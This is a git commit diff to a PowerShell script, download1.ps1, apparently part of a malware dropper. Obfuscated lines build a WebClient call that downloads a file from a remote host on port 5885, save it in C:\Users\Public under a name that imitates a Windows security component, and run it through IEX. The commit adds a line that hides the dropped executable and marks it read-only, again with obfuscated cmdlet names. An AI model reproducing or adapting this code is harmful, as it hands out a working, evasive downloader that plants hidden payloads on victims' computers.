22cccc17c4d692a4ec9ae79ebd044d6c5fe70fae
ExploitGF <32704607+ExploitGF@users.noreply.github.com>
2018-08-31 12:36:53 +0500

    Update download1.ps1

--- download1.ps1
+++ download1.ps1
@@ -5,6 +5,4 @@ IEX $unsplited
 $split = "(New-Object System.Net.Web~~Client).Downlo~~adFile('http://rphost.ru:5885/MS_ASC64_1.signed','C:\Users\Public\MSASCuiL.exe')"
 $unsplit = $split.Replace("~~","")
 IEX $unsplit
-$splt = "'C'+':\'+'User'+'s\'+'Pub'+'lic\'+'MSAS'+'Cui'+'L.e'+'xe'" | fo're'ach {$_.Attributes = 'ReadOnly, Hidden'}
-$syscall = $ScriptBlock.Replace("?","").Replace("'","").Replace("+","").Replace("%","")
-Ge't-It'em $syscall
+Ge't-It'em ('C'+':\'+'User'+'s\'+'Pub'+'lic\'+'MSAS'+'Cui'+'L.e'+'xe') | fo're'ach {$_.Attributes = 'ReadOnly, Hidden'}
